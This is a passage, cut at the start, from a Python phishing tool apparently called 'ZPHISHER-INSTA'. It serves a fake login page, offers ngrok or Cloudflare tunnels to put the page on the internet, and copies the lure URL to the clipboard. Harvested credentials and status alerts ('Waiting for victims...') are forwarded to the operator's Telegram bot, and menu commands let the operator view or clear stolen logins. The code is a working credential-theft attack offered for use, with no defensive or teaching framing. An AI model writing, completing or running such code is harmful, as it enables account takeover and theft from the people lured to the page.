            print(f"   {'─'*40}")
    
    print(f"\n{YELLOW}   Total: {len(captured_credentials)} credentials{RESET}")
    print(f"\n   Press ENTER to continue...")
    input()


# ================================================================
# 🚀 MAIN
# ================================================================

def main():
    global server_instance, ngrok_process, tunnel_url
    
    # Check token
    if BOT_TOKEN == "786543210:AAHd8fjs7dflksjdfklsjdf" or CHAT_ID == "123456789":
        print(f"\n{RED}[!] ERROR: Please set your BOT_TOKEN and CHAT_ID first!{RESET}")
        print(f"{YELLOW}[*] Open this script and edit lines 30-31{RESET}")
        print(f"{YELLOW}[*] Bot: @BotFather → /newbot → get token{RESET}")
        print(f"{YELLOW}[*] ID:  @userinfobot → /start → get ID{RESET}\n")
        sys.exit(1)
    
    # Check requests
    try:
        import requests
    except ImportError:
        print(f"\n{RED}[!] requests module not installed!{RESET}")
        print(f"{YELLOW}[*] Install: pip install requests{RESET}\n")
        sys.exit(1)
    
    # Create temp dir
    TEMP_DIR.mkdir(parents=True, exist_ok=True)
    
    # Write phishing page
    with open(HTML_FILE, 'w') as f:
        f.write(PHISHING_PAGE)
    
    while True:
        print_banner()
        print_menu()
        
        choice = input(f"\n{BOLD}[?] Choose option [0-3]: {RESET}").strip()
        
        if choice == '0':
            print(f"\n{YELLOW}[*] Exiting...{RESET}")
            sys.exit(0)
        
        elif choice == '1':
            # Localhost mode
            server_url = f"http://localhost:{PORT}"
            break
        
        elif choice == '2':
            # ngrok mode
            print(f"\n{YELLOW}[*] Checking ngrok...{RESET}")
            if check_ngrok():
                print(f"{GREEN}[+] ngrok found! Starting tunnel...{RESET}")
                url = start_ngrok(PORT)
                if url:
                    server_url = url
                    print(f"{GREEN}[+] Tunnel URL: {server_url}{RESET}")
                    break
                else:
                    print(f"{RED}[!] Failed to get ngrok URL{RESET}")
                    print(f"{YELLOW}[*] Falling back to localhost{RESET}")
                    server_url = f"http://localhost:{PORT}"
                    break
            else:
                print(f"{RED}[!] ngrok not installed!{RESET}")
                print(f"{YELLOW}[*] Install: https://ngrok.com/download{RESET}")
                input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
                continue
        
        elif choice == '3':
            # Cloudflare
            print(f"\n{YELLOW}[*] Checking cloudflared...{RESET}")
            if check_cloudflared():
                print(f"\n{GREEN}[+] cloudflared found!{RESET}")
                print(f"{YELLOW}[*] In another terminal, run:{RESET}")
                print(f"{CYAN}    cloudflared tunnel --url http://localhost:{PORT}{RESET}")
                print(f"\n{YELLOW}[*] Enter the Cloudflare URL below when ready{RESET}")
                cf_url = input(f"{BOLD}[?] Cloudflare URL: {RESET}").strip()
                if cf_url:
                    server_url = cf_url
                    break
                else:
                    print(f"{RED}[!] No URL entered, using localhost{RESET}")
                    server_url = f"http://localhost:{PORT}"
                    break
            else:
                print(f"{RED}[!] cloudflared not installed!{RESET}")
                print(f"{YELLOW}[*] Install: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/{RESET}")
                input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
                continue
    
    # ================================================================
    # START SERVER
    # ================================================================
    
    # Test Telegram connection
    print(f"\n[*] Testing Telegram connection...")
    if send_telegram(
        f"🚀 <b>ZPHISHER-INSTA STARTED</b>\n"
        f"📡 <b>URL:</b> <code>{server_url}</code>\n"
        f"🕐 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"🟢 <b>Status:</b> Waiting for victims..."
    ):
        print(f"{GREEN}[✅] Telegram bot connected!{RESET}")
    else:
        print(f"{RED}[❌] Telegram bot FAILED!{RESET}")
        print(f"{YELLOW}[!] Check your BOT_TOKEN and CHAT_ID{RESET}")
    
    # Start HTTP server in background
    server_instance = HTTPServer(('0.0.0.0', PORT), PhishHandler)
    server_thread = threading.Thread(target=server_instance.serve_forever, daemon=True)
    server_thread.start()
    
    print(f"{GREEN}[✅] Server started on port {PORT}{RESET}")
    
    # Auto-copy URL to clipboard
    try:
        if sys.platform == 'darwin':
            subprocess.run(['pbcopy'], input=server_url.encode(), timeout=2)
        elif sys.platform == 'linux':
            subprocess.run(['xclip', '-selection', 'clipboard'], input=server_url.encode(), timeout=2)
        print(f"{GREEN}[✅] URL copied to clipboard!{RESET}")
    except:
        pass
    
    # Main loop
    print_waiting(server_url)
    
    try:
        while True:
            cmd = input().strip().lower()
            
            if cmd == 'q':
                break
            elif cmd == 'c':
                captured_credentials.clear()
                with open(CRED_FILE, 'w') as f:
                    f.write("")
                print(f"\n{GREEN}[+] Credentials cleared!{RESET}")
                print_waiting(server_url)
            elif cmd == 'v':
                print_stats()
                print_waiting(server_url)
            elif cmd == '':
                print_waiting(server_url)
    
    except KeyboardInterrupt:
        pass
    
    finally:
        # Cleanup
        print(f"\n{YELLOW}[*] Shutting down...{RESET}")
        
        if server_instance:
            server_instance.shutdown()
        
        if ngrok_process:
            ngrok_process.terminate()
            subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
        
        # Send shutdown notification
        send_telegram(
            f"🔴 <b>ZPHISHER-INSTA STOPPED</b>\n"
            f"📊 <b>Total Credentials:</b> {len(captured_credentials)}\n"
            f"🕐 <b>Time:</b> {datetime.now().strftime('%H:%M:%S')}"
        )
        
        print(f"{GREEN}[+] Server stopped. Goodbye!{RESET}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Exiting...{RESET}")
        sys.exit(0)